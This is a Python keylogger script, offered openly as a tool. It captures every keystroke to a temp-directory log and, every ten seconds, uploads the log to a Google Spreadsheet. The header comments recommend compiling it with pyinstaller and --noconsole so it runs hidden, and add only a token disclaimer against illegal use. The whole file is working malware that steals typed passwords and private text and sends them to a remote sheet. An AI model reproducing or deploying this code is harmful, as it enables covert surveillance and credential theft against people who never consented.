###INFORMATIONS###
#2 files are needed:
# -1st: api_config.json (from console.developers.google.com from credentials, look after gspread module)
# -2nd: config.cfg (link to your Google SpreadSheet in your Google Drive, you need to share it to the API manager email in api_congfig.json)
#
#I recommend compiling this up with pyinstaller with --noconsole arg.
#The keyboard module in pip is outdate, use the one from the offical github repo.
#I used Python 3.7.1. Tested, working.
#
#################################################################################################
##BE RESPONSIBLE! DO NOT USE IT FOR ILLEGAL PORPUSES! ALL CONSEQUENCES ARE YOURS! I WARNED YOU!##
#################################################################################################
#
###END###

import sys
from time import sleep, gmtime, strftime
import logging
import gspread
from tempfile import gettempdir
from keyboard import on_press
from oauth2client.service_account import ServiceAccountCredentials

log_path = str(gettempdir()) + "\keylogger.log"
cfg_file = open("config.cfg", "r")
cfg = cfg_file.read()

scope = ["https://spreadsheets.google.com/feeds"]
creds = ServiceAccountCredentials.from_json_keyfile_name("api_config.json", scope)
client = gspread.authorize(creds)
sheet = client.open_by_url(cfg).sheet1

def OnKeyboardEvent(event):
    logging.basicConfig(filename=log_path,level=logging.DEBUG,format='%(message)s')
    str(event.name)
    logging.log(10,str(event.name))
    return True

def UploadLog():
    with open(log_path, 'r') as content_file:
        content = content_file.read()
        sheet.update_cell(1,1, str(content))
    sleep(10)
    UploadLog()

def Init():
    log_file = open(log_path, "w")
    log_file.close()                                                                #Deleting all contetns

    log_file = open(log_path, "w")
    log_file.write(str(sheet.cell(1,1).value))
    log_file.write(str(strftime("\n%H:%M:%S ", gmtime())) + "--NEW SESSION--\n")
    log_file.close()                                                                #Adding last sessions date, no overwriting


Init()
on_press(OnKeyboardEvent)
UploadLog()


